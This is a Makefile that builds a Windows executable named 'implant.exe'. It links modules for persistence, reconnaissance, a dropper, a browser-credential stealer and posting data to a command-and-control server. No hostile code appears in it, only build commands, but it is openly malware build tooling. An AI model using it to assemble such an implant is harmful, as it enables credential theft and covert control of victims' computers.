MAC = x86_64-w64-mingw32-g++ 
CXX = g++
LIBRARIES = -lWinHttp -lcrypt32 -luserenv -lbcrypt -lshlwapi -lUrlmon -lBcrypt -liphlpapi  -static

FILES = execute/execute.cpp file/file.cpp http/http.cpp persist/persist.cpp
FILES2 = situational_awareness/GatherInfo.cpp symkey.cpp dropper/Dropper.cpp
FILES3 = stealer/aes_gcm.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/stealer.cpp
FILES4 = sendtoc2/Post.cpp xor/xor.cpp 

apple: $(eval SHELL:=/bin/zsh)
	$(MAC) implant.cpp $(FILES) $(FILES2) $(FILES4) -I ${CURDIR}/sendtoc2/include -L ${CURDIR}/sendtoc2 $(LIBRARIES) -lcurl.dll -o implant.exe

windows: implant.cpp
	$(CXX) implant.cpp $(FILES) $(FILES2) $(FILES3) $(FILES4)  -I ${CURDIR}/sendtoc2/include -L ${CURDIR}/sendtoc2 $(LIBRARIES) -lcurl.dll -o implant.exe
